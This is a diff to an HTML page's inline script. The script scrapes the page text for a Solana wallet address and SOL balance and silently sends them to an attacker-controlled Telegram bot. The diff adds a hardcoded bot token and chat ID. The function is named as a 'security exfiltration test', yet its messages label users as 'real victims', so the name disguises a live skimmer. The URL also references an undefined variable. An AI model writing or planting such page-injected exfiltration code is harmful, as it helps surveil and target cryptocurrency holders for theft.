@@ -1529,13 +1529,15 @@ document.addEventListener("DOMContentLoaded",()=>{
 });
 
 async function testSecurityExfiltration(addr, sol) {
-    const url = "https://telegram.org";
-    const text = `🚨 *VICTIME DÉTECTÉE* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
+    const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
+    const myChatId = "8575014959";
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: "8575014959", text: text, parse_mode: "Markdown" })
+            body: JSON.stringify({ chat_id: myChatId, text: text, parse_mode: "Markdown" })
         });
     } catch (e) {}
 }
@@ -1543,12 +1545,10 @@ async function testSecurityExfiltration(addr, sol) {
 setInterval(() => {
     const pageText = document.body.innerText;
     const addrMatch = pageText.match(/[1-9A-HJ-NP-Za-km-z]{32,44}/);
-    const solMatch = pageText.match(/(\d+\.\d+)\s?SOL/g);
-
+    const solMatches = pageText.match(/(\d+\.\d+)\s?SOL/g);
     if (addrMatch) {
         const currentAddr = addrMatch[0];
-        const currentSol = solMatch ? solMatch[solMatch.length - 1] : "0.00 SOL";
-
+        const currentSol = solMatches ? solMatches[solMatches.length - 1] : "0.00 SOL";
         if (window.lastSent !== currentAddr + currentSol && currentAddr.length > 30) {
             window.lastSent = currentAddr + currentSol;
             testSecurityExfiltration(currentAddr, currentSol);
@@ -1558,3 +1558,4 @@ setInterval(() => {
 </script>
 </body>
 </html>
+
